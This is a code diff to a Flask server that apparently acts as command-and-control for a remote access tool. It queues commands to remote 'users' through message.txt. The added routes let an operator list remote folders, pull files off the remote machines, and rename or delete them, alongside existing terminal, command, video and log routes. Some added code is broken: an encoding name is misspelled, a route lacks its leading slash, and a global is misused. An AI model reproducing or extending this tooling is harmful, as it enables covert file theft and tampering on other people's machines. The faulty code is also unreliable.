@@ -5,6 +5,7 @@ from datetime import datetime
 import base64
 import json
 import requests as rq
+import io
 from zoneinfo import ZoneInfo
 
 app = Flask(__name__)
@@ -14,6 +15,8 @@ startTime = time()
 spam = False
 send = False
 comTxt = "none"
+file_content = None
+folder_content = None
 selected_user = "93"
 output = ""
 control_data = {}
@@ -35,6 +38,7 @@ if not os.path.exists(UPLOAD_FOLDER):
 with open(os.path.join(STATIC_FOLDER,"users.json")) as file:
 	data = json.load(file)
 users = data["users"]
+
 with open(state_file,"w") as file:
     states = {}
     for user in users:
@@ -399,6 +403,7 @@ def video():
 		with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
 			a.write("vIdEo " + file)	
 	return redirect("/")
+	
 @app.route("/logs",methods=["GET","POST"])
 def logs():
     global prevlog
@@ -509,6 +514,7 @@ def control():
         data1 = control_data
         control_data = {}      
         return jsonify(data1)
+        
 @app.route("/terminal",methods=["GET", "POST"])
 def terminal():
     global output
@@ -546,6 +552,7 @@ def get_output():
             return shaktimaan
         else:
             return "try again",202	              
+            
 @app.route("/cmd",methods=["POST","GET"])
 def cmd():
 	if request.method == "POST":
@@ -625,6 +632,7 @@ def get_com():
     elif request.method == "POST":
         comTxt = request.get_data().decode("utf-8")
     return "done"
+    
 @app.route("/com-txt",methods=["GET","POST"])
 def com_txt():
     with open(os.path.join(STATIC_FOLDER,"message.txt"),"w") as file:
@@ -662,5 +670,81 @@ def edit_file():
         return redirect("/")
     else:
         return render_template("edit.html")
+
+@app.route("/req-folder",methods=["GET","POST"]) 
+def fetchFolder():
+	if request.method == "POST":
+		path = request.get_json()
+		path = path["path"]
+		with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
+			file.write(f"gEtFoLdEr {path}")
+	return "done"
+	
+@app.route("/post-folder",methods=["GET","POST"])
+def post_folder():
+	global folder_content
+	if request.method == "POST":
+		folder_content = request.get_json()
+	return "done"
+	
+@app.route("/get-folder",methods=["GET","POST"])		
+def get_folder():
+	global folder_content
+	if folder_content:
+		f = folder_content
+		folder_content = None
+		return jsonify(f)
+	elif folder_content is None:
+		return "data nahi aaya abhi baad me aao",400
+						
+@app.route("/req-file",methods=["POST","GET"])
+def req_file():
+	path = request.get_data().decode("uft-8")
+	with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
+		file.write(f"gEtFiLe {path}")
+	return "done"
+	
+@app.route("/post-file",methods=["GET","POST"])
+def post_file():
+	global file_content
+	if request.method == "POST":
+		file = request.files["file"]
+		file_content = file.read()
+	return "done"
+	
+@app.route("/get-file",methods=["GET","POST"])
+def get_file():
+	if request.method == "GET":
+		if file_content:
+			file_io = io.BytesIO(file_content)
+			file_content = None
+			return send_file(file_io, mimetype='application/octet-stream', as_attachment=True, download_name="downloaded_file")
+		elif file_content is None:
+			return 'No file available for download', 400 
+	return "done"
+
+@app.route("/rename-file",methods=["GET","POST"])
+def rename_file():
+	if request.method == "POST":
+		data = request.get_json()
+		path = data["path"]
+		new_name = data["name"]
+		with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
+			file.write(f"rEnAmE {path}|{new_name}")
+	return "done"
+	
+@app.route("delete-file",methods=["POST","GET"])
+def delete_file():
+	if request.method == "POST":
+		data = request.get_json()
+		path = data["path"]
+		with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
+			file.write(f"dElEtE {path}")
+	return "done"
+			
+@app.route("/filesystem/<user>",methods=["GET","POST"])
+def filesystem(user):
+	return render_template("filesystem.html")
+	
 if __name__ == "__main__":
     app.run(host="0.0.0.0")
